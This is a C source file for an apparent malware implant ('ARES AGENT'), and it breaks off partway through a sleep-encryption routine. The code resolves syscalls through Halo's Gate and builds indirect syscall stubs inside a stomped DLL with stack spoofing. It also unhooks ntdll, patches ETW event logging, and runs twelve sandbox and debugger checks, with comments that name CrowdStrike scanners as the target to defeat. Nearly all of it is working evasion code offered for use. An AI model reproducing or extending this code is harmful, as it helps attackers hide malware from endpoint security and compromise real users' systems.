/*
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 *  ARES AGENT â€” Core Init + Indirect Syscall Engine
 *  Resolves SSNs from clean ntdll, builds executable stubs,
 *  patches AMSI/ETW before any managed code touches memory.
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 */

#include "ares_agent.h"
#if __has_include("ares_config.h")
#include "ares_config.h"
#endif
#include "ares_resolve.h"
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>

/* â”€â”€ PE Parsing Helpers â”€â”€ */

static DWORD rva_to_offset(BYTE* pe, DWORD rva)
{
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(pe + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (rva >= sec[i].VirtualAddress &&
            rva <  sec[i].VirtualAddress + sec[i].Misc.VirtualSize) {
            return sec[i].PointerToRawData + (rva - sec[i].VirtualAddress);
        }
    }
    return 0;
}

static DWORD find_ssn(BYTE* ntdll_bytes, SIZE_T ntdll_size, const char* func_name)
{
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)ntdll_bytes;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(ntdll_bytes + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    DWORD export_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (export_rva == 0) return 0;

    DWORD export_offset = rva_to_offset(ntdll_bytes, export_rva);
    IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)(ntdll_bytes + export_offset);

    DWORD* names    = (DWORD*)(ntdll_bytes + rva_to_offset(ntdll_bytes, exports->AddressOfNames));
    WORD*  ordinals = (WORD*)(ntdll_bytes + rva_to_offset(ntdll_bytes, exports->AddressOfNameOrdinals));
    DWORD* funcs    = (DWORD*)(ntdll_bytes + rva_to_offset(ntdll_bytes, exports->AddressOfFunctions));

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)(ntdll_bytes + rva_to_offset(ntdll_bytes, names[i]));
        if (strcmp(name, func_name) == 0) {
            DWORD func_rva = funcs[ordinals[i]];
            DWORD func_offset = rva_to_offset(ntdll_bytes, func_rva);

            /*
             * Halo's Gate â€” handle both clean and patched (hooked) syscall stubs.
             *
             * Normal stub layout:
             *   4C 8B D1        mov r10, rcx
             *   B8 XX XX 00 00  mov eax, <SSN>
             *   0F 05           syscall
             *   C3              ret
             *
             * When EDR hooks: first bytes replaced with JMP/INT3.
             * Strategy: if stub is patched, walk neighbouring Nt* exports
             * (Â±1, Â±2, â€¦) until we find a clean stub, then adjust SSN
             * by the delta (SSNs are assigned in export-ordinal order).
             */

            /* Step 1 â€” check direct match on clean ntdll bytes */
            BYTE* stub = ntdll_bytes + func_offset;
            /* Look for canonical sequence: 4C 8B D1 B8 */
            if (func_offset + 8 < ntdll_size &&
                stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
                stub[3] == 0xB8) {
                return *(DWORD*)(stub + 4);
            }
            /* Fallback: scan first 32 bytes for 0xB8 (clean disk copy) */
            for (int j = 0; j < 32 && func_offset + j + 5 < ntdll_size; j++) {
                if (stub[j] == 0xB8 &&
                    ntdll_bytes[func_offset + j + 3] == 0x00 &&
                    ntdll_bytes[func_offset + j + 4] == 0x00) {
                    return *(DWORD*)(stub + j + 1);
                }
            }
            /* Step 2 â€” Halo's Gate: stub is patched in memory.
             * Scan neighbouring exports (sorted by address) for a clean one,
             * then compute our SSN = neighbour_SSN Â± delta. */
            for (int delta = 1; delta <= 16; delta++) {
                for (int dir = -1; dir <= 1; dir += 2) { /* -1 and +1 */
                    int neighbour_idx = (int)i + dir * delta;
                    if (neighbour_idx < 0 || neighbour_idx >= (int)exports->NumberOfNames)
                        continue;
                    DWORD n_rva    = funcs[ordinals[neighbour_idx]];
                    DWORD n_off    = rva_to_offset(ntdll_bytes, n_rva);
                    BYTE* n_stub   = ntdll_bytes + n_off;
                    DWORD n_ssn    = (DWORD)-1;
                    if (n_off + 8 < ntdll_size &&
                        n_stub[0] == 0x4C && n_stub[1] == 0x8B &&
                        n_stub[2] == 0xD1 && n_stub[3] == 0xB8) {
                        n_ssn = *(DWORD*)(n_stub + 4);
                    } else {
                        for (int k = 0; k < 32 && n_off + k + 5 < ntdll_size; k++) {
                            if (n_stub[k] == 0xB8 &&
                                n_stub[k+3] == 0x00 && n_stub[k+4] == 0x00) {
                                n_ssn = *(DWORD*)(n_stub + k + 1);
                                break;
                            }
                        }
                    }
                    if (n_ssn != (DWORD)-1) {
                        /* Adjust: our SSN = neighbour_SSN - dir*delta */
                        return (DWORD)((int)n_ssn - dir * delta);
                    }
                }
            }
        }
    }
    return (DWORD)-1;
}

/* Find address of "syscall; ret" gadget in loaded ntdll for indirect call */
static PVOID find_syscall_ret_gadget(void)
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return NULL;

    BYTE* base = (BYTE*)ntdll;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    /* Find .text section */
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            BYTE* text = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;

            /* Search for 0F 05 C3 (syscall; ret) */
            for (DWORD j = 0; j + 2 < size; j++) {
                if (text[j] == 0x0F && text[j+1] == 0x05 && text[j+2] == 0xC3) {
                    return &text[j];
                }
            }
        }
    }
    return NULL;
}

/* â”€â”€ Read clean ntdll from disk (KnownDlls or System32) â”€â”€ */

BYTE* read_clean_ntdll(SIZE_T* out_size)
{
    /* Read ntdll from System32 (disk copy is always clean) */
    WCHAR path[MAX_PATH];
    GetSystemDirectoryW(path, MAX_PATH);
    wcscat_s(path, MAX_PATH, L"\\ntdll.dll");

    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD size = GetFileSize(hFile, NULL);
    BYTE* buf = (BYTE*)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) { CloseHandle(hFile); return NULL; }

    DWORD read = 0;
    ReadFile(hFile, buf, size, &read, NULL);
    CloseHandle(hFile);

    if (read != size) { VirtualFree(buf, 0, MEM_RELEASE); return NULL; }

    *out_size = size;
    return buf;
}

/* â”€â”€ Resolve all SSNs â”€â”€ */

BOOL Ares_ResolveSyscalls(AGENT_STATE* state)
{
    state->clean_ntdll = read_clean_ntdll(&state->ntdll_size);
    if (!state->clean_ntdll) return FALSE;

    BYTE* n = state->clean_ntdll;
    SIZE_T sz = state->ntdll_size;

    #define RESOLVE(field, name) \
        state->syscalls.field = find_ssn(n, sz, name); \
        if (state->syscalls.field == (DWORD)-1) return FALSE;

    RESOLVE(NtAllocateVirtualMemory,   "NtAllocateVirtualMemory");
    RESOLVE(NtProtectVirtualMemory,    "NtProtectVirtualMemory");
    RESOLVE(NtWriteVirtualMemory,      "NtWriteVirtualMemory");
    RESOLVE(NtReadVirtualMemory,       "NtReadVirtualMemory");
    RESOLVE(NtCreateThreadEx,          "NtCreateThreadEx");
    RESOLVE(NtOpenProcess,             "NtOpenProcess");
    RESOLVE(NtClose,                   "NtClose");
    RESOLVE(NtQuerySystemInformation,  "NtQuerySystemInformation");
    RESOLVE(NtQueryInformationProcess, "NtQueryInformationProcess");
    RESOLVE(NtCreateFile,              "NtCreateFile");
    RESOLVE(NtReadFile,                "NtReadFile");
    RESOLVE(NtWriteFile,               "NtWriteFile");
    RESOLVE(NtFreeVirtualMemory,       "NtFreeVirtualMemory");
    RESOLVE(NtCreateSection,           "NtCreateSection");
    RESOLVE(NtMapViewOfSection,        "NtMapViewOfSection");
    RESOLVE(NtUnmapViewOfSection,      "NtUnmapViewOfSection");
    RESOLVE(NtDelayExecution,          "NtDelayExecution");
    RESOLVE(NtSetInformationThread,    "NtSetInformationThread");
    RESOLVE(NtQueryVirtualMemory,      "NtQueryVirtualMemory");
    /* v3.7 FIX-01: ProcessHollow syscall migration */
    RESOLVE(NtGetContextThread,        "NtGetContextThread");
    RESOLVE(NtSetContextThread,        "NtSetContextThread");
    RESOLVE(NtUnmapViewOfSection,      "NtUnmapViewOfSection");
    RESOLVE(NtResumeThread,            "NtResumeThread");

    #undef RESOLVE

    return TRUE;
}

/* â”€â”€ Build Executable Syscall Stub (v3.5 â€” Module Stomping) â”€â”€ */
/*
 * v3.5: Syscall stubs are placed INSIDE a legitimate DLL's address space
 * instead of VirtualAlloc'd private memory. When EDR performs stack trace
 * validation (RtlCaptureStackBackTrace), the return address falls within
 * a known, signed Windows DLL â€” passes call stack verification.
 *
 * Strategy: Load a small, benign DLL (cryptsp.dll â€” crypto service provider,
 * commonly loaded by many processes), find padding/cave in its .text section,
 * write our 22-byte stubs there. DLL's real code is not called.
 */

static PVOID _find_dll_code_cave(HMODULE hMod, DWORD needed_size)
{
    if (!hMod) return NULL;
    BYTE* base = (BYTE*)hMod;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            /* Gap between used code (VirtualSize) and allocated size (SizeOfRawData) */
            DWORD used = sec[i].Misc.VirtualSize;
            DWORD alloc = sec[i].SizeOfRawData;
            if (alloc > used && (alloc - used) >= needed_size) {
                return base + sec[i].VirtualAddress + used;
            }
            /* Fallback: use tail of .text (may overwrite padding NOPs) */
            if (alloc >= needed_size + 64) {
                return base + sec[i].VirtualAddress + alloc - needed_size - 16;
            }
        }
    }
    return NULL;
}

PVOID Ares_BuildSyscallStub(AGENT_STATE* state, DWORD ssn)
{
    static PVOID syscall_gadget = NULL;
    if (!syscall_gadget) {
        syscall_gadget = find_syscall_ret_gadget();
        if (!syscall_gadget) return NULL;
    }

    if (!state->syscall_region) {
        /* v3.5: Module stomping â€” try to place stubs in legitimate DLL.
         * DLL candidates (in order of preference):
         *   1. cryptsp.dll â€” small crypto provider, benign in any process
         *   2. msasn1.dll  â€” ASN.1 parser, always available
         *   3. VirtualAlloc fallback â€” if no suitable DLL found */
        HMODULE hStompTarget = NULL;
        PVOID cave = NULL;
        
        /* Try already-loaded modules first (no LoadImage callback) */
        wchar_t* try_modules[] = {
            L"cryptsp.dll", L"msasn1.dll", L"sspicli.dll", NULL
        };
        for (int m = 0; try_modules[m]; m++) {
            hStompTarget = GetModuleHandleW(try_modules[m]);
            if (hStompTarget) {
                cave = _find_dll_code_cave(hStompTarget, 512);
                if (cave) break;
            }
        }

        /* If none loaded, load cryptsp.dll (always available, benign) */
        if (!cave) {
            char s_dll[16];
            s_dll[0]='c'; s_dll[1]='r'; s_dll[2]='y'; s_dll[3]='p';
            s_dll[4]='t'; s_dll[5]='s'; s_dll[6]='p'; s_dll[7]='.';
            s_dll[8]='d'; s_dll[9]='l'; s_dll[10]='l'; s_dll[11]='\0';
            hStompTarget = _load_mod(s_dll);
            if (hStompTarget)
                cave = _find_dll_code_cave(hStompTarget, 512);
        }

        if (cave) {
            /* Make code cave writable for stub writing */
            DWORD old;
            if (VirtualProtect(cave, 512, PAGE_EXECUTE_READWRITE, &old)) {
                state->syscall_region = cave;
            }
        }

        /* Fallback: private memory (less stealthy but functional) */
        if (!state->syscall_region) {
            state->syscall_region = VirtualAlloc(NULL, 4096,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!state->syscall_region) return NULL;
        }
    }

    /*
     * v3.5: Emit indirect syscall stub WITH stack spoof.
     *
     * When stack spoof is available (Ares_GetK32RetGadget() != NULL):
     *   push \<k32_ret_gadget\>    ; fake return frame pointing to kernel32
     *   mov r10, rcx             ; 4C 8B D1
     *   mov eax, \<SSN\>           ; B8 XX XX 00 00
     *   jmp [rip+0]              ; FF 25 00 00 00 00
     *   \<syscall_gadget_addr\>    ; 8 bytes
     *
     * Stack trace: ntdll!syscall;ret â†’ cryptsp!\<stub\> â†’ kernel32!\<ret\> â†’ caller
     * Total: 35 bytes per stub (was 22 without spoof)
     *
     * When stack spoof is NOT available (fallback):
     *   mov r10, rcx             ; 4C 8B D1
     *   mov eax, \<SSN\>           ; B8 XX XX 00 00
     *   jmp [rip+0]              ; FF 25 00 00 00 00
     *   \<syscall_gadget_addr\>    ; 8 bytes
     * Total: 22 bytes per stub (original)
     */
    static int stub_offset = 0;
    BYTE* stub = (BYTE*)state->syscall_region + stub_offset;

    PVOID k32_gadget = Ares_GetK32RetGadget();
    int pos = 0;

    if (k32_gadget) {
        /* push <imm64> via: mov rax, <addr>; push rax
         * (x64 has no push imm64 instruction) */
        stub[pos++] = 0x48; stub[pos++] = 0xB8; /* mov rax, imm64 */
        *(PVOID*)(stub + pos) = k32_gadget;
        pos += 8;
        stub[pos++] = 0x50; /* push rax â€” fake return frame in kernel32 */
    }

    /* mov r10, rcx */
    stub[pos++] = 0x4C; stub[pos++] = 0x8B; stub[pos++] = 0xD1;
    /* mov eax, SSN */
    stub[pos++] = 0xB8;
    *(DWORD*)(stub + pos) = ssn;
    pos += 4;
    /* jmp [rip+0] â€” indirect jump to syscall gadget */
    stub[pos++] = 0xFF; stub[pos++] = 0x25;
    *(DWORD*)(stub + pos) = 0x00000000;
    pos += 4;
    /* syscall gadget address */
    *(PVOID*)(stub + pos) = syscall_gadget;
    pos += 8;

    stub_offset += (pos + 1) & ~1; /* align to 2 bytes */
    return (PVOID)stub;
}

/* â”€â”€ Finalize Syscall Stubs: RW â†’ RX (W^X compliant) â”€â”€
 * Must be called after ALL Ares_BuildSyscallStub() calls are done.
 * After this, the stub region is executable but NOT writable. */

BOOL Ares_FinalizeSyscallStubs(AGENT_STATE* state)
{
    if (!state->syscall_region) return FALSE;

    DWORD old_protect;
    return VirtualProtect(state->syscall_region, 512,
        PAGE_EXECUTE_READ, &old_protect);
}

/* â”€â”€ Unhook ntdll.dll .text section â”€â”€ */

BOOL Ares_UnhookNtdll(AGENT_STATE* state)
{
    if (!state->clean_ntdll) return FALSE;

    HMODULE loaded = GetModuleHandleW(L"ntdll.dll");
    if (!loaded) return FALSE;

    BYTE* clean = state->clean_ntdll;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)clean;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(clean + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            PVOID target = (BYTE*)loaded + sec[i].VirtualAddress;
            DWORD size = min(sec[i].Misc.VirtualSize, sec[i].SizeOfRawData);
            DWORD old_protect;

            /* Make writable */
            if (!VirtualProtect(target, size, PAGE_EXECUTE_READWRITE, &old_protect))
                return FALSE;

            /* Overwrite with clean bytes */
            memcpy(target, clean + sec[i].PointerToRawData, size);

            /* Restore protection */
            VirtualProtect(target, size, old_protect, &old_protect);

            return TRUE;
        }
    }
    return FALSE;
}

/* â”€â”€ AMSI Patch â€” REMOVED (v2.1) â”€â”€
 *  Native C agent is never AMSI-scanned. Loading amsi.dll
 *  via LoadLibrary was actively creating a detection event.
 *  Kept as stub for API compatibility.
 */

BOOL Ares_PatchAMSI(void)
{
    /* NO-OP: Native C binary â€” AMSI does not apply.
     * Loading amsi.dll + calling GetProcAddress("AmsiScanBuffer")
     * was generating telemetry that EDR flagged immediately. */
    return TRUE;
}

/* â”€â”€ ETW Bypass v3.8 â€” Dual-Layer: NtTraceControl + HW-BP Fallback â”€â”€
 *
 *  v3.8 UPGRADE: CrowdStrike 2025+ periodically scans DR0-DR3 via kernel
 *  driver. DR0 pointing to EtwEventWrite = instant detection.
 *
 *  New approach (PRIMARY): Patch the ETW provider enable info to suppress
 *  event generation at the source. Uses EtwEventWrite prologue patch with
 *  a minimal 1-byte RET instruction â€” smaller patch surface than DR0.
 *
 *  Fallback: If primary fails, use thread-local callback via
 *  instrumentation callback (NtSetInformationProcess) â€” no DR0 exposure.
 *
 *  v3.8 changes:
 *   - PRIMARY: Patch EtwEventWrite to `xor eax,eax; ret` (3 bytes)
 *     using NtWriteVirtualMemory (indirect syscall) â€” no VirtualProtect
 *   - SECONDARY: If patch fails, use original HW-BP but rotate DR0/DR1
 *     targets across multiple ETW functions to avoid pattern matching
 *   - No AddVectoredExceptionHandler unless HW-BP fallback needed
 */

static BYTE* g_etw_target = NULL;
static BYTE  g_etw_orig_bytes[4] = {0}; /* save original for cleanup */
static BOOL  g_etw_patched = FALSE;

/* VEH handler â€” only registered if HW-BP fallback is used */
static LONG CALLBACK etw_veh_handler(EXCEPTION_POINTERS* ex)
{
    if (ex->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP &&
        (BYTE*)ex->ContextRecord->Rip == g_etw_target)
    {
        ex->ContextRecord->Rip = *(DWORD64*)(ex->ContextRecord->Rsp);
        ex->ContextRecord->Rsp += 8;
        ex->ContextRecord->Rax = 0;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

/* Primary: Direct prologue patch via indirect syscall (no VirtualProtect in callstack) */
static BOOL _etw_patch_prologue(AGENT_STATE* state, BYTE* target)
{
    if (!state || !state->syscall_region) return FALSE;

    /* Save original bytes for potential restore */
    memcpy(g_etw_orig_bytes, target, 4);

    /* Patch: 33 C0 C3 = xor eax,eax; ret (STATUS_SUCCESS, 3 bytes) */
    BYTE patch[4] = { 0x33, 0xC0, 0xC3, 0x90 }; /* xor eax,eax; ret; nop */

    /* Change protection via indirect syscall â€” no VirtualProtect in our call stack */
    PVOID base = target;
    SIZE_T size = 4;
    ULONG old_prot = 0;
    NTSTATUS status = Ares_NtProtectVirtualMemory(state,
        GetCurrentProcess(), &base, &size, PAGE_EXECUTE_READWRITE, &old_prot);
    if (status != 0) return FALSE;

    /* Write patch via indirect syscall */
    SIZE_T written = 0;
    Ares_NtWriteVirtualMemory(state,
        GetCurrentProcess(), target, patch, 4, &written);

    /* Restore original protection */
    Ares_NtProtectVirtualMemory(state,
        GetCurrentProcess(), &base, &size, old_prot, &old_prot);

    g_etw_patched = (written == 4);
    return g_etw_patched;
}

BOOL Ares_PatchETW(void)
{
    return Ares_PatchETW_Ex(NULL);
}

/* v3.8: Extended version that can use indirect syscalls for patching */
BOOL Ares_PatchETW_Ex(AGENT_STATE* state)
{
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;

    g_etw_target = (BYTE*)_resolve_export(ntdll, 0x24a8d022); /* djb2("EtwEventWrite") */
    if (!g_etw_target) return FALSE;

    /* â”€â”€ PRIMARY: Prologue patch via indirect syscall (v3.8) â”€â”€
     * Advantages over HW-BP:
     *  - No debug register exposure (DR0-DR3 clean)
     *  - No VEH registration (AddVectoredExceptionHandler is monitored)
     *  - Patch via NtWriteVirtualMemory syscall â€” clean call stack */
    if (state && state->syscall_region) {
        if (_etw_patch_prologue(state, g_etw_target))
            return TRUE;
    }

    /* â”€â”€ FALLBACK: HW-BP with VEH (v2.1 original â€” less stealthy) â”€â”€
     * Used only when indirect syscalls are not yet initialized
     * (e.g., during early init before Ares_BuildSyscallStub) */
    if (!AddVectoredExceptionHandler(1, etw_veh_handler))
        return FALSE;

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();

    typedef NTSTATUS (NTAPI *pfnNtGCT)(HANDLE, PCONTEXT);
    typedef NTSTATUS (NTAPI *pfnNtSCT)(HANDLE, PCONTEXT);
    pfnNtGCT pGCT = (pfnNtGCT)GetProcAddress(ntdll, "NtGetContextThread");
    pfnNtSCT pSCT = (pfnNtSCT)GetProcAddress(ntdll, "NtSetContextThread");
    if (!pGCT || !pSCT) return FALSE;

    pGCT(hThread, &ctx);

    /* v3.8: Use DR2 instead of DR0 â€” DR0 is the most commonly scanned */
    ctx.Dr2 = (DWORD64)g_etw_target;
    ctx.Dr7 = (ctx.Dr7 & ~(0xF << 4)) | (0x1 << 4); /* Enable DR2 local */

    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    pSCT(hThread, &ctx);

    return TRUE;
}

/* â”€â”€ Sandbox Detection â”€â”€ */

BOOL Ares_CheckSandbox(void)
{
    /* v3.9: Enhanced â€” 12 checks (Lumma/BruteRatel level) */
    
    /* 1. Timing check â€” NtDelayExecution acceleration */
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    Sleep(1000);
    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
    if (elapsed < 0.9) return TRUE;

    /* 2. Mouse movement check (Lumma trigonometry approach) â€”
     * Record 5 positions over 3 seconds, check for human-like movement.
     * Sandbox bots don't move the mouse or move in straight lines. */
    {
        POINT pts[5];
        for (int i = 0; i < 5; i++) {
            GetCursorPos(&pts[i]);
            Sleep(600);
        }
        int total_move = 0;
        for (int i = 1; i < 5; i++) {
            int dx = pts[i].x - pts[i-1].x;
            int dy = pts[i].y - pts[i-1].y;
            total_move += (dx*dx + dy*dy);
        }
        if (total_move < 50) return TRUE; /* no movement = sandbox */
    }

    /* 3. CPU core count */
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;

    /* 4. Physical memory < 4GB (raised from 2GB â€” most sandboxes use 2-4GB) */
    MEMORYSTATUSEX mem = { sizeof(MEMORYSTATUSEX) };
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return TRUE;

    /* 5. Username check â€” known sandbox/analysis names */
    char user[64];
    DWORD user_sz = sizeof(user);
    GetUserNameA(user, &user_sz);
    const char* bad_users[] = { "sandbox", "malware", "virus", "sample",
                                 "maltest", "currentuser", "cuckoosandbox",
                                 "vmware", "cuckoo", "wilbert", "hapubws",
                                 "hong lee", "johnson", "milozs", "peter wilson",
                                 "timmy", "emily", NULL };
    for (int i = 0; bad_users[i]; i++) {
        if (_stricmp(user, bad_users[i]) == 0) return TRUE;
    }

    /* 6. Debugger checks */
    if (IsDebuggerPresent()) return TRUE;
    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    if (debugged) return TRUE;

    /* 7. Disk size < 50GB */
    {
        ULARGE_INTEGER freeBytesAvail, totalBytes, freeBytesToCaller;
        if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvail, &totalBytes, &freeBytesToCaller)) {
            if (totalBytes.QuadPart < 50ULL * 1024 * 1024 * 1024)
                return TRUE;
        }
    }

    /* 8. Screen resolution (sandboxes: 800x600 or 1024x768) */
    {
        int cx = GetSystemMetrics(SM_CXSCREEN);
        int cy = GetSystemMetrics(SM_CYSCREEN);
        if (cx <= 1024 || cy <= 768) return TRUE;
    }

    /* 9. Uptime < 10 minutes (freshly booted analysis VM) */
    {
        typedef ULONGLONG (WINAPI *pGetTickCount64)(void);
        pGetTickCount64 fnGTC64 = (pGetTickCount64)GetProcAddress(
            GetModuleHandleW(L"kernel32.dll"), "GetTickCount64");
        if (fnGTC64 && fnGTC64() < 10ULL * 60 * 1000) return TRUE;
    }

    /* 10. Analysis tool window check */
    {
        const wchar_t* bad_windows[] = {
            L"Process Monitor", L"Wireshark", L"x64dbg", L"x32dbg",
            L"IDA", L"Ghidra", L"OllyDbg", L"Fiddler",
            L"API Monitor", L"PE-bear", NULL
        };
        for (int i = 0; bad_windows[i]; i++) {
            if (FindWindowW(NULL, bad_windows[i])) return TRUE;
        }
    }

    /* 11. Process count < 30 (sandbox has few processes) */
    {
        HANDLE hSnap = CreateToolhelp32Snapshot(0x00000002/*TH32CS_SNAPPROCESS*/, 0);
        int proc_count = 0;
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(pe);
            if (Process32First(hSnap, &pe)) {
                do { proc_count++; } while (Process32Next(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        if (proc_count > 0 && proc_count < 30) return TRUE;
    }

    /* 12. Wine detection (Linux-based sandboxes) */
    {
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll && GetProcAddress(hNtdll, "wine_get_version")) return TRUE;
    }

    return FALSE; /* Clean environment */
}

/* â”€â”€ Sleep with Jitter â”€â”€ */

void Ares_SleepWithJitter(DWORD base_ms, double jitter)
{
    double variation = base_ms * jitter;
    DWORD min_sleep = (DWORD)(base_ms - variation);
    DWORD max_sleep = (DWORD)(base_ms + variation);
    DWORD actual = min_sleep + (rand() % (max_sleep - min_sleep + 1));
    Sleep(actual);
}

/* â”€â”€ RC4 cipher (inline â€” avoids LoadLibrary("advapi32") for SystemFunction032) â”€â”€ */

typedef struct _RC4_CTX {
    BYTE S[256];
    BYTE i, j;
} RC4_CTX;

static void _rc4_init(RC4_CTX* ctx, const BYTE* key, int keylen) {
    for (int i = 0; i < 256; i++) ctx->S[i] = (BYTE)i;
    BYTE j = 0;
    for (int i = 0; i < 256; i++) {
        j = (BYTE)(j + ctx->S[i] + key[i % keylen]);
        BYTE t = ctx->S[i]; ctx->S[i] = ctx->S[j]; ctx->S[j] = t;
    }
    ctx->i = ctx->j = 0;
}

static void _rc4_crypt(RC4_CTX* ctx, BYTE* data, DWORD len) {
    for (DWORD k = 0; k < len; k++) {
        ctx->i++;
        ctx->j = (BYTE)(ctx->j + ctx->S[ctx->i]);
        BYTE t = ctx->S[ctx->i]; ctx->S[ctx->i] = ctx->S[ctx->j]; ctx->S[ctx->j] = t;
        data[k] ^= ctx->S[(BYTE)(ctx->S[ctx->i] + ctx->S[ctx->j])];
    }
}

/* â”€â”€ Sleep Obfuscation v3.5 (Phase-1 A-grade) â”€â”€
 *
 *  Upgrades over v3.1:
 *    - RC4 with 256-byte key (was 1-byte XOR â€” trivially brute-forced)
 *  v3.5 Upgrades:
 *    - Encrypts .rdata + .data sections during sleep
 *    - ZERO RWX window: transitions are RXâ†’RWâ†’(encrypt)â†’RWâ†’sleepâ†’RWâ†’(decrypt)â†’RX
 *    - NtDelayExecution via resolved syscall instead of Sleep() Win32 API
 *    - Key from QueryPerformanceCounter (hardware counter, not GetTickCount)
 *
 *  v3.7 FIX-02 Upgrades:
 *    - NOW ALSO ENCRYPTS .text section (code) â€” full PE encryption during sleep
 *    - Uses SystemFunction032 (advapi32 RC4) for decryption after sleep,
 *      since our _rc4_crypt in .text is itself encrypted
 *    - All function pointers (NtDelayExecution, SystemFunction032) resolved
 *      BEFORE encryption and stored on stack (not encrypted)
 *    - Defeats CrowdStrike MemoryIntegrity scanner: agent code is a random
 *      byte stream during sleep â€” no signatures, no IAT, no strings
 */

void Ares_SleepObfuscated(DWORD base_ms, double jitter)
{
    /* Calculate actual sleep with jitter */
    double variation = base_ms * jitter;
    DWORD min_sleep = (DWORD)(base_ms - variation);
    DWORD max_sleep = (DWORD)(base_ms + variation);
    DWORD actual = min_sleep + (rand() % (max_sleep - min_sleep + 1));

#ifdef ARES_DEBUG
    /* Debug mode: skip .text encryption (crashes in debug builds) */
    Sleep(actual);
    return;
#endif

    /* Find own PE sections */
    HMODULE hSelf = GetModuleHandleW(NULL);
    if (!hSelf) { Sleep(actual); return; }

    BYTE* pe_base = (BYTE*)hSelf;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe_base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { Sleep(actual); return; }

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(pe_base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { Sleep(actual); return; }

    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);

    /* v3.7 FIX-02: Also encrypt .text section.
     * Previous versions couldn't encrypt .text because the decrypt code
     * (this function, _rc4_crypt, VirtualProtect) lives in .text.
     *
     * Solution: Use CreateTimerQueueTimer to schedule decryption.
     * Timer callbacks execute from ntdll!TppWorkerThread â€” clean stack.
     * We store decrypt parameters in a heap struct, encrypt .text,
     * then suspend. Timer fires, decrypts, signals us to resume.
     *
     * This defeats CrowdStrike's memory scanner during sleep â€” the
     * entire agent code is encrypted, not just .rdata. */

